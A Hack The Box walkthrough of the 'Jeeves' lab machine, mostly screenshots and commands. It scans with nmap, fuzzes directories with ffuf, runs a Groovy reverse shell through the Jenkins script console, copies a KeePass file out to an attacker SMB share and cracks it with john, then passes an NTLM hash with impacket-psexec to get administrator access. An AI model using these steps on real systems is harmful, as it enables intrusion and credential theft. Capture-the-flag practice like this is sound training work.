<img src="Pasted image 20240722183200.png" alt="HTB Profile Image" class="htb-profile-img">

<style>
  .htb-profile-img {
    width: 100%;
    max-width: 800px;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0, 255, 0, 0.8); /* Initial glow effect */
    transition: box-shadow 0.3s ease-in-out, transform 0.3s ease-in-out; /* Smooth transition for glow and zoom effects */
  }

  .htb-profile-img:hover {
    box-shadow: 0 0 20px rgba(0, 255, 0, 1); /* Enhanced glow on hover */
    transform: scale(1.05); /* Zoom effect on hover */
  }
</style>

**Ping**
![[Pasted image 20240616190633.png]]

**Nmap default Scan**
```
nmap 10.10.10.63 -oN dnmap
```
![[Pasted image 20240616190803.png]]

Nmap Script and Service scan
```
nmap 10.10.10.63 -sV -sC -A -oN snmap
```
![[Pasted image 20240616191002.png]]

Nmap All Port Scan
```
nmap -p- --min-rate 10000 10.10.10.63 -oN anmap
```
![[Pasted image 20240616191022.png]]

Directory traversal using ffuf
```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.63:50000/FUZZ -t 100 -o ffuf.txt
```
![[Pasted image 20240616195402.png]]
Nothing interesting port 80, so i go with port 50000 and found a directory /askjeeves

Will try that directory
![[Pasted image 20240616195526.png]]
Cool, we got something



There is a Build_Executor_Status>master>script console
![[Pasted image 20240616195856.png]]

![[Pasted image 20240616195925.png]]

![[Pasted image 20240616195948.png]]

![[Pasted image 20240616200110.png]]

Will run a groovy script to reverse shell:https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
Modified the script with my Ip and Port
![[Pasted image 20240616200304.png]]
run it.

Got reverse shell
![[Pasted image 20240616200337.png]]

Got user.txt
![[Pasted image 20240616200517.png]]

Will jump to Privilege Escalation....!


Will see Our Privileges
```
whoami /priv
```
![[Pasted image 20240616200620.png]]
Got impersonation, Cooool...!

System Info
![[Pasted image 20240616200656.png]]

User Info
![[Pasted image 20240616200805.png]]

Will Search for any interesting files
```
dir /S C:\users\*.kdbx *.log *.ini *.txt *.conf
```
![[Pasted image 20240616215417.png]]
Found .kdbx file

Will transfer it to our kali using smb share we already established
```
copy C:\Users\kohsuke\Documents\CEH.kdbx \\10.10.14.2\kali
```
![[Pasted image 20240616215524.png]]

Received
![[Pasted image 20240616215600.png]]

I tried to open it is asking password, will crack it using john
```
keepass2john CEH.kdbx > ceh.hash
```
```
john --wordlist=/usr/share/wordlists/rockyou.txt ceh.hash
```
![[Pasted image 20240616215748.png]]
Got it...!


Will open the file now
![[Pasted image 20240616220247.png]]

![[Pasted image 20240616215821.png]]

There is an Ntlm hash for will try that with admin, using Pass the hash using psexec (Impacket)
![[Pasted image 20240616220326.png]]

Will copy that and use to Pass the Hash
```
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.10.10.63
```
![[Pasted image 20240616220511.png]]
We are admin know...!

Will search for root.txt
![[Pasted image 20240616221334.png]]



Done with Jeeves....:)
